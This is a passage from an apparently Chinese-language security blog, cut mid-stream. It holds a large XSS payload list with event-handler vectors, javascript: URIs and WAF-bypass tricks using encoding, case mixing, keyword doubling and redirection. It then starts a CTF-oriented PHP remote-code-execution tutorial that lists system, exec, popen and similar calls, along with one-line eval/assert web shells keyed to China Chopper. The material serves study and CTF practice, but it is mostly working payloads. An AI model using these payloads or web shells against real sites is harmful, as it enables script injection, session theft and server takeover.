onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;button&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 元素上点击鼠标时触发</span></span><br><span class="line">&lt;button onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;text&lt;/button&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;p&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 元素上按下鼠标时触发</span></span><br><span class="line">&lt;p onmousedown=<span class="string">&quot;alert(1)&quot;</span>&gt;text&lt;/p&gt;</span><br><span class="line"><span class="comment">// 元素上释放鼠标时触发</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">onmouseup</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;details&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br><span class="line"><span class="comment">// 使用open属性触发ontoggle事件，无需用户去触发</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;select&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/select&gt;</span><br><span class="line"><span class="comment">// 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;video&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;audio&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;textarea&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>); autofocus&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;keygen&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>)&gt; <span class="comment">// 仅限火狐</span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;marquee&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;&lt;/marquee&gt; </span><br><span class="line"><span class="comment">// Chrome不行，火狐和IE都可以</span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;isindex&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt; <span class="comment">// 仅限于IE</span></span><br></pre></td></tr></table></figure><ol><li><code>利用link远程包含js文件</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在无CSP的情况下才可以</span></span><br><span class="line">&lt;link rel=<span class="keyword">import</span> href=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure><ol><li><code>javascript伪协议</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;a&gt;标签</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;</span><br><span class="line"><span class="comment">// &lt;iframe&gt;标签</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="comment">// &lt;img&gt;标签</span></span><br><span class="line">&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt; //IE7以下</span><br><span class="line">// &lt;form&gt;标签</span><br><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure><ol><li><code>expression属性</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt; </span><br><span class="line"><span class="comment">// IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>  </span><br><span class="line"><span class="comment">// IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;<span class="attribute">x</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="comment">// IE7以下</span></span><br></pre></td></tr></table></figure><ol><li><code>background属性</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/table&gt;</span><br><span class="line"><span class="comment">// 在Opera 10.5和IE6上有效</span></span><br></pre></td></tr></table></figure><h3 id="过滤绕过："><a href="#过滤绕过：" class="headerlink" title="过滤绕过："></a>过滤绕过：</h3><ol><li>过滤空格</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 / 代替空格</span></span><br><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure><ol><li>过滤关键字</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 大小写绕过</span></span><br><span class="line">&lt;<span class="title class_">ImG</span> sRc=x onerRor=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br><span class="line"><span class="comment">// 双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)</span></span><br><span class="line">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</span><br><span class="line">// 字符拼接(利用eval)</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;&gt;</span><br><span class="line">// 字符拼接(利用top)</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)</span><br></pre></td></tr></table></figure><ol><li>其它字符混淆</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了</span></span><br><span class="line"><span class="comment">下面举几个简单的例子*/</span></span><br><span class="line"><span class="comment">// 可利用注释、标签的优先级等</span></span><br><span class="line">&lt;&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>); <span class="comment">//&lt;&lt;/script&gt;</span></span><br><span class="line">&lt;scri&lt;!--test--&gt;pt&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello world!&quot;</span>)&lt;/scri&lt;!--test--&gt;pt&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; </span><br><span class="line">// 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><ol><li>编码绕过</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Unicode编码绕过</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;</span><br><span class="line">//url编码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">//Ascii码绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line">//Hex绕过</span><br><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br><span class="line">//八进制绕过</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;</span><br><span class="line">//base64绕过</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><ol><li>过滤双引号，单引号</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="title function_">alert</span>(<span class="string">``</span>xss<span class="string">``</span>);&gt;</span><br><span class="line"><span class="comment">//使用编码绕过，具体看上面列举的例子</span></span><br></pre></td></tr></table></figure><ol><li>过滤括号</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当括号被过滤的时候可以使用throw来绕过</span></span><br><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><ol><li>过滤url地址</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用url编码</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">``</span><span class="attr">http</span>:<span class="comment">//%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;</span></span><br><span class="line"><span class="comment">//使用IP</span></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://</span><br><span class="line">//使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)</span><br><span class="line">//使用中文逗号代替英文逗号</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-RCE</title>
      <link href="/2025/04/14/CTF-Web-PHP-RCE/"/>
      <url>/2025/04/14/CTF-Web-PHP-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-PHP-RCE"><a href="#CTF-Web-PHP-RCE" class="headerlink" title="CTF-Web-PHP-RCE"></a>CTF-Web-PHP-RCE</h1><hr><p>~<strong><em>made by Mitunlny（M.Y）</em></strong>~</p><hr><blockquote><p>参考文章：</p><ul><li><p><a href="https://www.cnblogs.com/tomyyyyy/p/13905357.html">https://www.cnblogs.com/tomyyyyy/p/13905357.html</a></p></li><li><p><a href="https://blog.csdn.net/2302_76827504/article/details/130427099">https://blog.csdn.net/2302_76827504/article/details/130427099</a></p></li><li><p><a href="https://developer.aliyun.com/article/1224913">https://developer.aliyun.com/article/1224913</a></p></li><li><p><a href="https://blog.csdn.net/qq_45392044/article/details/145836455">https://blog.csdn.net/qq_45392044/article/details/145836455</a></p></li><li><a href="https://www.cnblogs.com/chir/p/13420148.html">https://www.cnblogs.com/chir/p/13420148.html</a></li></ul></blockquote><h1 id="PHP-RCE-基础"><a href="#PHP-RCE-基础" class="headerlink" title="PHP RCE 基础"></a>PHP RCE 基础</h1><h2 id="一、RCE漏洞概述"><a href="#一、RCE漏洞概述" class="headerlink" title="一、RCE漏洞概述"></a>一、RCE漏洞概述</h2><h3 id="什么是RCE——基本概念"><a href="#什么是RCE——基本概念" class="headerlink" title="什么是RCE——基本概念"></a>什么是RCE——基本概念</h3><p>远程代码/命令执行漏洞（Remote Code/Command Execute，简称RCE）是Web安全领域中危害性极高的漏洞类型，主要分为两类：</p><ol><li><strong>代码执行漏洞</strong>：针对后端编程语言（如PHP、Java、Python等）的漏洞</li><li><strong>命令执行漏洞</strong>：针对操作系统层面的漏洞</li></ol><p>本篇仅涉及PHP的代码执行漏洞</p><h3 id="RCE漏洞成因"><a href="#RCE漏洞成因" class="headerlink" title="RCE漏洞成因"></a>RCE漏洞成因</h3><p>当开发人员为了实现功能灵活性，在代码中调用<strong>动态执行函数</strong>时，若未对用户输入进行严格过滤，攻击者就可以构造恶意输入执行任意代码或系统命令。这种漏洞通常出现在以下场景：</p><ul><li>使用字符串转代码函数（如eval()）</li><li>调用系统命令函数（如system()）</li><li>动态包含文件功能</li><li>模板引擎解析</li></ul><h2 id="二、相关函数"><a href="#二、相关函数" class="headerlink" title="二、相关函数"></a>二、相关函数</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><strong>system()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#string system ( string $command [, int &amp;$return_var ] )</span></span><br><span class="line"><span class="comment">#system()函数执行有回显，将执行结果输出到页面上</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>exec()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>popen()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#resource popen ( string $command , string $mode )</span></span><br><span class="line"><span class="comment">#函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读#和写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>( <span class="string">&#x27;whoami &gt;&gt; c:/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span> ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ls /tmp/test&quot;</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打一个进程通道  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//从通道里面取得东西  </span></span><br><span class="line"> <span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);  </span><br><span class="line"> <span class="keyword">echo</span>  <span class="variable">$out</span>;         <span class="comment">//打印出来  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>proc_open()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="comment">#与Popen函数类似，但是可以提供双向管道</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误  </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容  </span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>passthru()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#void passthru ( string $command [, int &amp;$return_var ] )</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#string shell_exec( string &amp;command)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>反引号 `</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体，当禁用shell_exec时，` 也不可执行</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>pcntl_exec()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#void pcntl_exec ( string $path [, array $args [, array $envs ]] )</span></span><br><span class="line"><span class="comment">#path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本</span></span><br><span class="line"><span class="comment">#args是一个要传递给程序的参数的字符串数组。</span></span><br><span class="line"><span class="comment">#pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。</span></span><br><span class="line"><span class="comment">#pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span> ( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p><strong>eval()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#传入的参数必须为PHP代码，既需要以分号结尾。</span></span><br><span class="line"><span class="comment">#命令执行：cmd=system(whoami);</span></span><br><span class="line"><span class="comment">#菜刀连接密码：cmd</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。</span></span><br><span class="line"><span class="comment">#命令执行：cmd=system(whoami)</span></span><br><span class="line"><span class="comment">#菜刀连接密码：cmd</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>preg_replace()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#preg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)</span></span><br><span class="line"><span class="comment">#执行命令和上传文件参考assert函数(不需要加分号)。</span></span><br><span class="line"><span class="comment">#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>create_function()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建匿名函数执行代码</span></span><br><span class="line"><span class="comment">#执行命令和上传文件参考eval函数(必须加分号)。</span></span><br><span class="line"><span class="comment">#菜刀连接密码：cmd</span></span><br><span class="line"><span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="variable">$func</span>();</span><br></pre></td></tr></table></figure><p><strong>array_map()</strong></p><figure class="highlight 